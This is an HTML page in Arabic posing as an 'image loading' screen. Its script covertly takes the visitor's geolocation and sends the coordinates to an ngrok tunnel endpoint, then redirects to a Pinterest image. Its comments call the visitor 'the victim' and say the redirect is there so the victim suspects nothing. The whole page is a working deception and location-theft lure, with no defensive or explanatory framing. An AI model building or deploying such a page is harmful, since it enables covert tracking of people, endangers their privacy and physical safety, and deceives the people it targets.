<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل الصورة...</title>
    <style>
        body { background-color: black; color: white; text-align: center; padding-top: 20%; font-family: Arial; }
    </style>
</head>
<body>
    <h2>جاري تحميل الصورة الخاصة بك...</h2>

    <script>
        window.onload = function() {
            // طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(function(pos) {
                
                // الرابط الخاص بك مدمج هنا وجاهز
                var myNgrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 

                // إرسال الإحداثيات إلى VS Code
                fetch(myNgrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, {
                    mode: 'no-cors'
                });

                // التحويل للصورة الحقيقية ليبدو الأمر طبيعياً
                setTimeout(function() {
                    window.location.href = "https://i.pinimg.com/originals/fe/7e/35/fe7e3547d52670be96486121f00845a7.jpg";
                }, 1000);

            }, function(err) {
                // إذا رفض الضحية، يتم تحويله للصورة أيضاً لكي لا يشك في شيء
                window.location.href = "https://i.pinimg.com/originals/fe/7e/35/fe7e3547d52670be96486121f00845a7.jpg";
            });
        };
    </script>
</body>
</html>
